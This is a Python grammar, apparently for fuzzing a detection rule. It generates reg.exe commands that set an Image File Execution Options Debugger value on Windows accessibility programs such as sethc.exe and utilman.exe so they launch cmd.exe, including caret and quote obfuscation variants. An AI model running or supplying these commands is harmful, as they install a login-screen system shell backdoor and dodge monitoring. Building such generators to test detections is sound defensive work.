win_registry_install_reg_debugger_backdoor_grammar = {
    "<start>": [
        "<executable> <verb> <key> <params_reordered>"
    ],
    "<executable>": [
        "reg.exe",
        "REG",
        "%windir%\\system32\\reg.exe"
    ],
    "<verb>": [
        "add",
        "ADD",
        "a^dd"
    ],
    "<key>": [
        "\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\<key_path_fuzzed>\\<target_exe>\"",
        "'HKLM/SOFTWARE/Microsoft/Windows NT/<key_path_fuzzed>/<target_exe>'"
    ],
    "<key_path_fuzzed>": [
        "CurrentVersion\\Image File Execution Options",
        "Cur^rentVersion\\Image''File''Execution^Options",
        "CurrentVersion\\\"Image File Execution Options\""
    ],
    "<target_exe>": [
        "sethc.exe",
        "utilman.exe",
        "osk.exe",
        "magnify.exe",
        "narrator.exe",
        "displayswitch.exe",
        "atbroker.exe",
        "HelpPane.exe"
    ],
    "<params_reordered>": [
        "<v_param> <t_param> <d_param> <f_param>",
        "<d_param> <v_param> <t_param> <f_param>",
        "<t_param> <d_param> <v_param> <f_param>"
    ],
    "<v_param>": [
        "/v Debugger",
        "/V \"Debugger\""
    ],
    "<t_param>": [
        "/t REG_SZ"
    ],
    "<d_param>": [
        "/d C:\\windows\\system32\\cmd.exe",
        "/d %comspec%"
    ],
    "<f_param>": [
        "/f",
        ""
    ]
}